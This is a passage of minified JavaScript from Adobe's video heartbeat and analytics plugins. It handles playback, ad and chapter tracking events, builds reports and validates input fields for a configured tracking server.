f(this,this._stashedLastInBandItem.eventData.type(),this._stashedLastInBandItem.eventData.playhead(),e,this._stashedLastInBandItem.callback);t.filterReport=this._stashedLastInBandItem.filterReport,this._lastInBandItem=t,this._stashedLastInBandItem=null}},i.prototype._flushLastInbandItem=function(e){if(this._lastInBandItem){this._updateQoSInfo(e);var t=new f(this,this._lastInBandItem.eventData.type(),e.playhead,this._lastInBandItem.meta,this._lastInBandItem.callback);this._sendHit(t,!0)}},i.prototype._createAndSendReport=function(e){var t=this._reportFactory.createReportForItem(e);t.qosData.isStartupTimeOverridden||t.qosData.startupTime(this._autoComputedStartupTime);var a={};if(a[N]=t,this._channel.trigger(new s(se,a)),t.eventData.type()==p.EVENT_TYPE_START||t.eventData.type()==p.EVENT_TYPE_PLAY||t.eventData.type()==p.EVENT_TYPE_PAUSE||t.eventData.type()==p.EVENT_TYPE_STALL||t.eventData.type()==p.EVENT_TYPE_BUFFER){var o={};o[q]=!0,this._channel.command(E,o)}},i.prototype._sendHit=function(e,t){switch(e.eventData.type()){case p.EVENT_TYPE_START:case p.EVENT_TYPE_PLAY:case p.EVENT_TYPE_PAUSE:case p.EVENT_TYPE_STALL:case p.EVENT_TYPE_BUFFER:this._lastInBandItem?(this._updateLastInBandItem(e),this._lastInBandItem.eventData.type()==p.EVENT_TYPE_START&&this._lastInBandItem.assetData.type()==m.TYPE_MAIN_CONTENT&&(this._autoComputedStartupTime+=this._lastInBandItem.eventData.duration()),this._createAndSendReport(this._lastInBandItem),t&&this._lastInBandItem.eventData.type()==e.eventData.type()||this._createAndSendReport(e)):this._createAndSendReport(e),this._lastInBandItem=e;break;case p.EVENT_TYPE_COMPLETE:case p.EVENT_TYPE_SKIP:if(this._lastInBandItem&&(this._updateLastInBandItem(e),this._createAndSendReport(this._lastInBandItem)),e.eventData.type()!==p.EVENT_TYPE_SKIP&&this._createAndSendReport(e),e.assetData.type()==m.TYPE_MAIN_CONTENT){this._lastInBandItem=null,this._stashedLastInBandItem=null;var a={};a[q]=!0,this._channel.command(D,a)}else e.assetData.type()==m.TYPE_AD&&(this._lastInBandItem.assetData.adData(null),this._lastInBandItem.assetData.type(m.TYPE_MAIN_CONTENT),this._doNotOverrideEventDuration=!0);break;case p.EVENT_TYPE_CHAPTER_START:case p.EVENT_TYPE_CHAPTER_COMPLETE:case p.EVENT_TYPE_CHAPTER_SKIP:this._lastInBandItem&&(this._updateLastInBandItem(e),this._createAndSendReport(this._lastInBandItem)),e.eventData.type()!==p.EVENT_TYPE_CHAPTER_SKIP&&this._createAndSendReport(e),this._lastInBandItem&&(this._lastInBandItem.assetData.chapterData(e.eventData.type()==p.EVENT_TYPE_CHAPTER_START?new v(e.assetData.chapterData()):null),this._lastInBandItem.eventData.duration(0),this._createAndSendReport(this._lastInBandItem));break;default:this._createAndSendReport(e)}};var k="ah::Context",T="sourceErrorSDK",S="error",E="clock:reporting.resume",D="clock:reporting.pause",I="reporting_interval",P="session_id",C="reset_session_id",A="callback",L="filter_report",N="report",q="reset",x="track_external_errors",j="reporting_interval",V="do_not_override_interval",R="api:aa_start",M="api:aa_ad_start",O="api:video_load",Q="api:video_unload",B="api:video_start",U="api:video_complete",F="api:video_skip",$="api:video_resume",H="api:video_session_end",K="api:adbreak_start",Y="api:adbreak_complete",G="api:ad_start",z="api:ad_complete",W="api:ad_skip",X="api:play",J="api:pause",Z="api:buffer_start",ee="api:chapter_start",te="api:chapter_complete",ae="api:chapter_skip",oe="api:track_error",ie="api:track_internal_error",re="api:bitrate_change",ne="api:quantum_end",se="context:report_available",de="net:check_status_complete",ce="reporting:update_interval",le=6e5,ue=2e3,ge=10;o.context.Context=i}(e.ADB.core,e.ADB.va,e.ADB.va.utils,t),function(e){"use strict";var t="unknown";e.AdobeHeartbeatPluginConfig=function(e,a){this.trackingServer=e,this.publisher=a,this.ssl=!1,this.ovp=t,this.sdk=t,this.quietMode=!1,this.debugLogging=!1,this.__isPrimetime=!1,this.__psdkVersion=null}}(t),function(e){"use strict";function t(){}t.prototype.onError=function(e){},t.prototype.onTrackingDisabled=function(){},e.AdobeHeartbeatPluginDelegate=t}(t),function(e,t,a){"use strict";function o(e){o.__super__.constructor.call(this,h),this._radio=new d(this._logger),this._channel=this._radio.channel(S),this._delegate=e,this._context=new u(this._channel,this._logger),this._filter=new g(this._channel,this._logger),this._network=new p(this._channel,this._logger),this._setupDataResolver()}var i=e.Event,r=e.Trigger,n=e.plugin.BasePlugin,s=e.plugin.ParamMapping,d=e.radio.Radio,c=t.ErrorInfo,l=t.Version,u=a.context.Context,g=a.filter.ReportFilter,p=a.network.Network,m=a.clock.Clock,_=a.AdobeHeartbeatPluginConfig;e.extend(o,n),o.prototype.configure=function(e){if(!e)throw new Error("Reference to the configuration data cannot be NULL.");if(!(e instanceof _))throw new Error("Expected config data to be instance of AdobeHeartbeatPluginConfig.");this._config=e,this._config.debugLogging?this._logger.enable():this._logger.disable(),this._logger.debug(this._logTag,"#configure({trackingServer="+this._config.trackingServer+", publisher="+this._config.publisher+", quietMode="+this._config.quietMode+", ssl="+this._config.ssl+"})");var t=this._config.trackingServer+"/settings/",a={};a[ne]=this._config.trackingServer,a[se]=t,a[de]=this._config.publisher,a[ce]=this._config.quietMode,a[le]=this._config.ssl,this._channel.trigger(new i(he,a)),this._isConfigured=!0},o.prototype.bootstrap=function(e){o.__super__.bootstrap.call(this,e),this._channel.on(E,this._onError,this),this._clock=new m(this._pluginManager,this._channel,this._logger),this._channel.command(Be),this._channel.trigger(new i(Ge)),this._channel.on(pe,this._onCheckStatusComplete,this),this._registerCommands(),this._registerBehaviours()},o.prototype._teardown=function(){this._logger.debug(this._logTag,"#_teardown()"),this._radio.shutdown(),this._context.destroy(),this._clock.destroy(),this._filter.destroy(),this._network.destroy()},o.prototype._canProcess=function(){return this._isConfigured?this._errorInfo?(this._logger.error(this._logTag,"_canProcess() > Plugin in ERROR state."),!1):o.__super__._canProcess.call(this):(this._logger.error(this._logTag,"_canProcess() > Plugin not configured."),!1)},o.prototype._cmdAnalyticsError=function(e){this._errorInfo||(this._errorInfo=new c("Internal error","AdobeAnalyticsPlugin is in ERROR state."),this._trigger(E,this._errorInfo),this._delegate&&this._delegate.onError(this._errorInfo))},o.prototype._cmdAnalyticsStart=function(e){if(this._canProcess()){var t={};t[ue]=e.visitorOptedOut,this._channel.trigger(new i(ye,t)),this._channel.trigger(new i(me,e))}},o.prototype._cmdAnalyticsAdStart=function(e){this._canProcess()&&this._channel.trigger(new i(_e,e))},o.prototype._cmdVideoLoad=function(e){this._errorInfo=null,this._canProcess()&&(this._isTrackingSessionActive&&this._channel.trigger(new i(fe,e)),this._isTrackingSessionActive=!1,this._isPaused=!0,this._isSeeking=!1,this._isBuffering=!1,this._isVideoIdle=!1,this._filter.clear(),this._channel.trigger(new i(ve,e)),this._isTrackingSessionActive=!0)},o.prototype._cmdVideoUnload=function(e){this._errorInfo=null,this._canProcess()&&(this._channel.trigger(new i(fe,e)),this._filter.flush(),this._runReportingTimer(!1),this._runFlushFilterTimer(!1),this._runIdleTimer(!1),this._isTrackingSessionActive=!1)},o.prototype._cmdVideoSessionEnd=function(e){this._canProcess()&&this._channel.trigger(new i(Se,e))},o.prototype._cmdVideoStart=function(e){this._canProcess()&&(this._channel.trigger(new i(be,e)),this._filter.flush())},o.prototype._cmdVideoComplete=function(e){this._canProcess()&&this._channel.trigger(new i(we,e))},o.prototype._cmdVideoSkip=function(e){this._canProcess()&&this._channel.trigger(new i(ke,e))},o.prototype._cmdVideoResume=function(e){this._canProcess()&&this._channel.trigger(new i(Te,e))},o.prototype._cmdPlay=function(e){this._canProcess()&&(this._isPaused=!1,this._resumePlaybackIfPossible(e))},o.prototype._cmdPause=function(e){this._canProcess()&&(this._channel.trigger(new i(Le,e)),this._isPaused=!0,this._runIdleTimer(!0))},o.prototype._cmdAdBreakStart=function(e){this._canProcess()&&this._channel.trigger(new i(Ee,e))},o.prototype._cmdAdBreakComplete=function(e){this._canProcess()&&(this._channel.trigger(new i(De,e)),this._resumePlaybackIfPossible(e))},o.prototype._cmdAdStart=function(e){this._canProcess()&&(this._channel.trigger(new i(Ie,e)),this._resumePlaybackIfPossible(e))},o.prototype._cmdAdComplete=function(e){this._canProcess()&&this._channel.trigger(new i(Pe,e))},o.prototype._cmdAdSkip=function(e){this._canProcess()&&this._channel.trigger(new i(Ce,e))},o.prototype._cmdBufferStart=function(e){this._canProcess()&&(this._channel.trigger(new i(Ne,e)),this._isBuffering=!0,this._runIdleTimer(!0))},o.prototype._cmdBufferComplete=function(e){this._canProcess()&&(this._isBuffering=!1,this._isPaused?this._channel.trigger(new i(Le,e)):this._resumePlaybackIfPossible(e))},o.prototype._cmdSeekStart=function(e){this._canProcess()&&(this._channel.trigger(new i(Le,e)),this._isSeeking=!0,this._runIdleTimer(!0))},o.prototype._cmdSeekComplete=function(e){this._canProcess()&&(this._isSeeking=!1,this._resumePlaybackIfPossible(e))},o.prototype._cmdChapterStart=function(e){this._canProcess()&&this._channel.trigger(new i(qe,e))},o.prototype._cmdChapterComplete=function(e){this._canProcess()&&this._channel.trigger(new i(xe,e))},o.prototype._cmdChapterSkip=function(e){this._canProcess()&&this._channel.trigger(new i(je,e))},o.prototype._cmdBitrateChange=function(e){this._canProcess()&&this._channel.trigger(new i(Me,e))},o.prototype._cmdTrackError=function(e){this._canProcess()&&this._channel.trigger(new i(Ve,e))},o.prototype._cmdClockReportingTick=function(e){this._canProcess()&&this._channel.trigger(new i(Oe,e))},o.prototype._onCheckStatusComplete=function(e){if(this._canProcess()){var t=!1;e&&e.data&&e.data[ge]&&(t=e.data[ge]),this._logger.debug(this._logTag,"#_onCheckStatusComplete(trackingDisabled="+t+")"),t&&this._delegate&&this._delegate.onTrackingDisabled()}},o.prototype._cmdIdleTick=function(e){this._canProcess()&&(this._isVideoIdle=!0,this._trigger(ee),this._channel.trigger(new i(Se,e)),this._filter.flush(),this._runReportingTimer(!1),this._runFlushFilterTimer(!1),this._runIdleTimer(!1),this._trigger(J))},o.prototype._onError=function(e){this._errorInfo=e.data;var t={};t[ie]=Qe,t[re]=this._errorInfo.getMessage()+"|"+this._errorInfo.getDetails(),this._channel.trigger(new i(Re,t)),this._runReportingTimer(!1),this._trigger(E,this._errorInfo),this._delegate&&this._delegate.onError(this._errorInfo)},o.prototype._runIdleTimer=function(e){var t={};t[oe]=!0,e?this._channel.command(Ke,t):this._channel.command(Ye,t)},o.prototype._runFlushFilterTimer=function(e){var t={};t[oe]=!0,e?this._channel.command($e,t):this._channel.command(He,t)},o.prototype._runReportingTimer=function(e){var t={};t[oe]=!0,e?this._channel.command(Ue,t):this._channel.command(Fe,t)},o.prototype._registerCommands=function(){this._pluginManager.comply(this,"handleAnalyticsError",this._cmdAnalyticsError),this._pluginManager.comply(this,"handleAnalyticsStart",this._cmdAnalyticsStart),this._pluginManager.comply(this,"handleAnalyticsAdStart",this._cmdAnalyticsAdStart),this._pluginManager.comply(this,"handleVideoLoad",this._cmdVideoLoad),this._pluginManager.comply(this,"handleVideoUnload",this._cmdVideoUnload),this._pluginManager.comply(this,"handleVideoSessionEnd",this._cmdVideoSessionEnd),this._pluginManager.comply(this,"handleVideoStart",this._cmdVideoStart),this._pluginManager.comply(this,"handleVideoComplete",this._cmdVideoComplete),this._pluginManager.comply(this,"handleVideoSkip",this._cmdVideoSkip),this._pluginManager.comply(this,"handleVideoResume",this._cmdVideoResume),this._pluginManager.comply(this,"handlePlay",this._cmdPlay),this._pluginManager.comply(this,"handlePause",this._cmdPause),this._pluginManager.comply(this,"handleAdBreakStart",this._cmdAdBreakStart),this._pluginManager.comply(this,"handleAdBreakComplete",this._cmdAdBreakComplete),this._pluginManager.comply(this,"handleAdStart",this._cmdAdStart),this._pluginManager.comply(this,"handleAdComplete",this._cmdAdComplete),this._pluginManager.comply(this,"handleAdSkip",this._cmdAdSkip),this._pluginManager.comply(this,"handleBufferStart",this._cmdBufferStart),this._pluginManager.comply(this,"handleBufferComplete",this._cmdBufferComplete),this._pluginManager.comply(this,"handleSeekStart",this._cmdSeekStart),this._pluginManager.comply(this,"handleSeekComplete",this._cmdSeekComplete),this._pluginManager.comply(this,"handleChapterStart",this._cmdChapterStart),this._pluginManager.comply(this,"handleChapterComplete",this._cmdChapterComplete),this._pluginManager.comply(this,"handleChapterSkip",this._cmdChapterSkip),this._pluginManager.comply(this,"handleBitrateChange",this._cmdBitrateChange),this._pluginManager.comply(this,"handleTrackError",this._cmdTrackError),this._pluginManager.comply(this,"handleClockReportingTick",this._cmdClockReportingTick),this._pluginManager.comply(this,"handleIdleTick",this._cmdIdleTick)},o.prototype._registerBehaviours=function(){this._pluginManager.registerBehaviour(new r(f,P),this,"handleVideoLoad",[new s(v,"rsid","rsid"),new s(v,"tracking_server","trackingServer")]),this._pluginManager.registerBehaviour(new r(f,C),this,"handleVideoUnload"),this._pluginManager.registerBehaviour(new r(f,A),this,"handleVideoSessionEnd",[new s(f,"video.playhead","playhead")]),this._pluginManager.registerBehaviour(new r(f,L),this,"handleVideoStart",[new s(f,"video.id","videoId"),new s(f,"video.name","videoName"),new s(f,"video.length","videoLength"),new s(f,"video.playhead","playhead"),new s(f,"video.playerName","playerName"),new s(f,"video.streamType","streamType"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime"),new s(v,"rsid","rsid"),new s(v,"tracking_server","trackingServer"),new s(v,"channel","channel"),new s(v,"meta.video.*","metaVideo"),new s(v,"ssl","useSsl"),new s(b,"meta","metaNielsen"),new s(y,"publisher","publisher"),new s(y,"sdk","sdk"),new s(y,"ovp","ovp"),new s(y,"version","version"),new s(y,"api_level","apiLvl")]),this._pluginManager.registerBehaviour(new r(f,q),this,"handleVideoComplete",[new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,x),this,"handleVideoSkip",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,N),this,"handleVideoResume",[new s(f,"video.id","videoId"),new s(f,"video.name","videoName"),new s(f,"video.length","videoLength"),new s(f,"video.playhead","playhead"),new s(f,"video.playerName","playerName"),new s(f,"video.streamType","streamType")]),this._pluginManager.registerBehaviour(new r(f,j),this,"handlePlay",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,V),this,"handlePause",[new s(f,"video.playhead","playhead"),new s(f,"video.playheadStalled","playheadStalled"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,M),this,"handleAdBreakStart",[new s(f,"ad.isInAdBreak","isInAdBreak"),new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,O),this,"handleAdBreakComplete",[new s(f,"ad.isInAdBreak","isInAdBreak"),new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,Q),this,"handleAdStart",[new s(f,"video.playhead","playhead"),new s(f,"ad.id","adId"),new s(f,"ad.name","adName"),new s(f,"ad.length","adLength"),new s(f,"ad.position","adPosition"),new s(f,"ad.granularTracking","adGranularTracking"),new s(f,"ad.trackingInterval","adTrackingInterval"),new s(f,"pod.name","podName"),new s(f,"pod.playerName","podPlayerName"),new s(f,"pod.position","podPosition"),new s(f,"pod.startTime","podSecond"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime"),new s(v,"meta.video.*","metaVideo"),new s(v,"meta.ad.*","metaAd"),new s(b,"meta","metaNielsen"),new s(b,"metaAd","metaAdNielsen")]),this._pluginManager.registerBehaviour(new r(f,B),this,"handleAdComplete",[new s(f,"video.playhead","playhead"),new s(f,"ad.isInAdBreak","isInAdBreak"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,U),this,"handleAdSkip",[new s(f,"video.playhead","playhead"),new s(f,"ad.isInAdBreak","isInAdBreak"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,F),this,"handleBufferStart",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,$),this,"handleBufferComplete",[new s(f,"video.playhead","playhead"),new s(f,"video.playheadStalled","playheadStalled"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,H),this,"handleSeekStart",[new s(f,"video.playhead","playhead")]),this._pluginManager.registerBehaviour(new r(f,K),this,"handleSeekComplete",[new s(f,"video.playhead","playhead"),new s(f,"ad.isInAd","isInAd"),new s(f,"ad.id","adId"),new s(f,"ad.position","adPosition"),new s(f,"pod.playerName","podPlayerName"),new s(f,"pod.position","podPosition"),new s(f,"chapter.isInChapter","isInChapter"),new s(f,"chapter.position","chapterPosition"),new s(f,"chapter.name","chapterName"),new s(f,"chapter.length","chapterLength"),new s(f,"chapter.startTime","chapterOffset"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,Y),this,"handleChapterStart",[new s(f,"video.playhead","playhead"),new s(f,"chapter.position","chapterPosition"),new s(f,"chapter.name","chapterName"),new s(f,"chapter.length","chapterLength"),new s(f,"chapter.startTime","chapterOffset"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime"),new s(v,"meta.video.*","metaVideo"),new s(v,"meta.chapter.*","metaChapter"),new s(b,"meta","metaNielsen")]),this._pluginManager.registerBehaviour(new r(f,G),this,"handleChapterComplete",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,z),this,"handleChapterSkip",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,W),this,"handleBitrateChange",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,X),this,"handleTrackError"),this._pluginManager.registerBehaviour(new r(w,te),this,"handleClockReportingTick",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(f,R),this,"handleClockReportingTick",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(w,ae),this,"handleIdleTick",[new s(f,"video.playhead","playhead")]),this._pluginManager.registerBehaviour(new r(y,ee),this,"handleClockReportingTick",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(v,E),this,"handleAnalyticsError"),this._pluginManager.registerBehaviour(new r(v,D),this,"handleAnalyticsStart",[new s(v,"vid","vid"),new s(v,"aid","aid"),new s(v,"mid","mid"),new s(v,"customerIDs","customerIDs"),new s(v,"visitorOptedOut","visitorOptedOut"),new s(v,"blob","blob"),new s(v,"loc_hint","loc_hint"),new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")]),this._pluginManager.registerBehaviour(new r(v,I),this,"handleAnalyticsAdStart",[new s(f,"video.playhead","playhead"),new s(f,"qos.fps","fps"),new s(f,"qos.droppedFrames","droppedFrames"),new s(f,"qos.bitrate","bitrate"),new s(f,"qos.startupTime","startupTime")])},o.prototype._setupDataResolver=function(){var e={},t=this;e.version=function(){return l.getVersion()},e.api_level=function(){return l.getApiLevel()},e.tracking_server=function(){return t._config?t._config.trackingServer:null},e.publisher=function(){return t._config?t._config.publisher:null},e.quiet_mode=function(){return!!t._config&&t._config.quietMode},e.ovp=function(){return t._config?t._config.ovp:null},e.sdk=function(){return t._config?t._config.sdk:null},e.is_primetime=function(){return!!t._config&&t._config.__isPrimetime},e.psdk_version=function(){return t._config?t._config.__psdkVersion:null},e.session_id=function(){return t._channel.request(k)},this._dataResolver=function(t){if(!t||0==t.length)return null;for(var a=null,o=0;o<t.length;o++){var i=t[o];(a=a||{})[i]=e.hasOwnProperty(i)?e[i].call(this):null}return a}},o.prototype._resumePlaybackIfPossible=function(e){this._errorInfo||this._isPaused||this._isSeeking||this._isBuffering||(this._isVideoIdle?(this._isVideoIdle=!1,this._resumePlaybackFromIdle()):this._channel.trigger(new i(Ae,e)),this._runIdleTimer(!1))},o.prototype._resumePlaybackFromIdle=function(){this._trigger(ee),this._filter.clear(),this._channel.trigger(new i(T)),this._trigger(Z),this._runReportingTimer(!0),this._runFlushFilterTimer(!0)};var h="adobe-heartbeat",y=h,v="adobe-analytics",f="player",b="nielsen",w="service.clock",k="session_id",T="reset_session_id",S="heartbeat-channel",E="error",D="aa_start",I="sc_ad_start",P="video_load",C="video_unload",A="video_session_end",L="video_start",N="video_resume",q="video_complete",x="video_skip",j="play",V="pause",R="content_start",M="adbreak_start",O="adbreak_complete",Q="ad_start",B="ad_complete",U="ad_skip",F="buffer_start",$="buffer_complete",H="seek_start",K="seek_complete",Y="chapter_start",G="chapter_complete",z="chapter_skip",W="bitrate_change",X="track_error",J="video_idle_start",Z="video_idle_resume",ee="quantum_close",te="heartbeat.reporting.tick",ae="heartbeat.idle.tick",oe="reset",ie="source",re="error_id",ne="tracking_server",se="check_status_server",de="publisher",ce="quiet_mode",le="ssl",ue="visitor_opt_out",ge="tracking_disabled",pe="net:check_status_complete",me="api:aa_start",_e="api:aa_ad_start",he="api:config",ye="api:update_visitor_optout",ve="api:video_load",fe="api:video_unload",be="api:video_start",we="api:video_complete",ke="api:video_skip",Te="api:video_resume",Se="api:video_session_end",Ee="api:adbreak_start",De="api:adbreak_complete",Ie="api:ad_start",Pe="api:ad_complete",Ce="api:ad_skip",Ae="api:play",Le="api:pause",Ne="api:buffer_start",qe="api:chapter_start",xe="api:chapter_complete",je="api:chapter_skip",Ve="api:track_error",Re="api:track_internal_error",Me="api:bitrate_change",Oe="api:quantum_end",Qe="sourceErrorHeartbeat",Be="clock:check_status.resume",Ue="clock:reporting.resume",Fe="clock:reporting.pause",$e="clock:flush_filter.resume",He="clock:flush_filter.pause",Ke="clock:idle.resume",Ye="clock:idle.pause",Ge="clock:check_status.get_settings";a.AdobeHeartbeatPlugin=o}(e.ADB.core,e.ADB.va,t),e.ADB.va.plugins.ah||(e.ADB.va.plugins.ah=t)}(this),function(e){if(void 0===t)var t={};!function(e,t){"use strict";function a(e,t){this._onFail={fn:e,ctx:t}}var o=e.ErrorInfo;a.prototype.validateFields=function(e,t){if(!e)return this._fail("Data cannot be null");if(t)for(var a=0;a<t.length;a++){var o=t[a];switch(o){case"videoId":if(!e.hasOwnProperty("videoId"))return this._fail("The ID for the main video must be specified.");if("string"!=typeof e.videoId)return this._fail("The ID for the main video must be a String.");if(""===e.videoId)return this._fail("The ID for the main video cannot be an empty string.");break;case"mediaType":if(!e.hasOwnProperty("mediaType"))return this._fail("The media type for the main video must be specified.");if("string"!=typeof e.mediaType)return this._fail("The media type for the main video must be a String.");if(""===e.mediaType)return this._fail("The stream type for the main video cannot be an empty string.");break;case"streamType":if(!e.hasOwnProperty("streamType"))return this._fail("The stream type for the main video must be specified.");if("string"!=typeof e.streamType)return this._fail("The stream type for the main video must be a String.");if(""===e.streamType)return this._fail("The stream type for the main video cannot be an empty string.");break;case"playerName":if(!e.hasOwnProperty("playerName"))return this._fail("The player name for the main video must be specified.");if("string"!=typeof e.playerName)return this._fail("The player name for the main video must be a String.");if(""===e.playerName)return this._fail("The player name for the main video cannot be an empty string.");break;case"videoLength":if(!e.hasOwnProperty("videoLength"))return this._fail("The length of the main video must be specified.");if("number"!=typeof e.videoLength)return this._fail("The length of the main video must be a Number.");if(isNaN(e.videoLength))return this._fail("The length of the main video cannot be NaN.");break;case"podPlayerName":if(!e.hasOwnProperty("podPlayerName"))return this._fail("The player name for the ad-break must be specified.");if("string"!=typeof e.podPlayerName)return this._fail("The player name for the ad-break must be a String.");if(""===e.podPlayerName)return this._fail("The player name for the ad-break cannot be an empty string.");break;case"podPosition":if(!e.hasOwnProperty("podPosition"))return this._fail("Position (index) of the ad-break must be specified.");if("number"!=typeof e.podPosition)return this._fail("Position (index) of the ad-break must be a Number.");if(isNaN(e.podPosition))return this._fail("Position (index) of the ad-break cannot be NaN.");break;case"adId":if(!e.hasOwnProperty("adId"))return this._fail("The ad ID must be specified.");if("string"!=typeof e.adId)return this._fail("The ad ID must be a String.");if(""===e.adId)return this._fail("The ad ID cannot be an empty string.");break;case"adPosition":if(!e.hasOwnProperty("adPosition"))return this._fail("Position (index) of the ad must be specified.");if("number"!=typeof e.adPosition)return this._fail("Position (index) of the ad must be a Number.");if(isNaN(e.adPosition))return this._fail("Position (index) of the ad cannot be NaN.");break;case"adLength":if(!e.hasOwnProperty("adLength"))return this._fail("The length of the ad must be specified.");if("number"!=typeof e.adLength)return this._fail("The length of the ad must be a Number.");if(isNaN(e.adLength))return this._fail("The length of the ad cannot be NaN.");break;default:return this._fail("Unable to validate unknown parameter: "+o)}}return!0},a.prototype._fail=function(e){var t=new o("Invalid input data",e);return this._onFail.fn&&this._onFail.fn.call(this._onFail.ctx,t),!1},t.InputDataValidator=a}(e.ADB.va,t),function(e){"use strict";var t="";e.AdobeAnalyticsPluginConfig=function(){this.channel=t,this.debugLogging=!1}}(t),function(e){"use strict";function t(){}t.prototype.onError=function(e){},e.AdobeAnalyticsPluginDelegate=t}(t),function(e,t,a,o){"use strict";function i(e,t){if(i.__super__.constructor.call(this,y),!e)throw new Error("The reference to the AppMeasurement object cannot be NULL.");if(e.unsupportedBrowser)throw new Error("AppMeasurement is not supported in current browser.");this._appMeasurement=e,this._delegate=t,this._videoMetadata={},this._adMetadata={},this._chapterMetadata={},this._errorInfo=null,this._workQueue=new l(!0,k),this._inputDataValidator=new h((function(e){this._errorInfo=e,this._logger.error(this._logTag,e.getMessage()+" | "+e.getDetails());var t=this;setTimeout((function(){t._trigger(T,e),t._delegate&&t._delegate.onError(t._errorInfo)}),0)}),this),this._appMeasurement.isReadyToTrack(),this._setupDataResolver()}var r=e.Trigger,n=e.plugin.BasePlugin,s=e.plugin.ParamMapping,d=e.radio.Channel,c=e.radio.Command,l=e.radio.CommandQueue,u=t.ErrorInfo,g=a.md5,p=a.StringUtils,m=a.ObjectUtils,_=o.AdobeAnalyticsPluginConfig,h=o.InputDataValidator;e.extend(i,n),i.prototype.configure=function(e){if(!e)throw new Error("Reference to the configuration data cannot be NULL.");if(!(e instanceof _))throw new Error("Expected config data to be instance of AdobeAnalyticsPluginConfig.");this._config=e,this._config.debugLogging?this._logger.enable():this._logger.disable(),this._logger.debug(this._logTag,"#configure({trackingServer="+this._config.debugLogging+", channel="+this._config.channel+", ssl="+this._appMeasurement.ssl+"})")},i.prototype.bootstrap=function(e){i.__super__.bootstrap.call(this,e),this._registerCommands(),this._registerBehaviours()},i.prototype.setup=function(){this._appMeasurement.isReadyToTrack()?this._onAppMeasurementReady():this._appMeasurement.callbackWhenReadyToTrack(this,this._onAppMeasurementReady,[]),i.__super__.setup.call(this)},i.prototype.setVideoMetadata=function(e){this._videoMetadata=m.clone(e)},i.prototype.setAdMetadata=function(e){this._adMetadata=m.clone(e)},i.prototype.setChapterMetadata=function(e){this._chapterMetadata=m.clone(e)},i.prototype._canProcess=function(){return this._errorInfo?(this._logger.error(this._logTag,"#_canProcess() > In ERROR 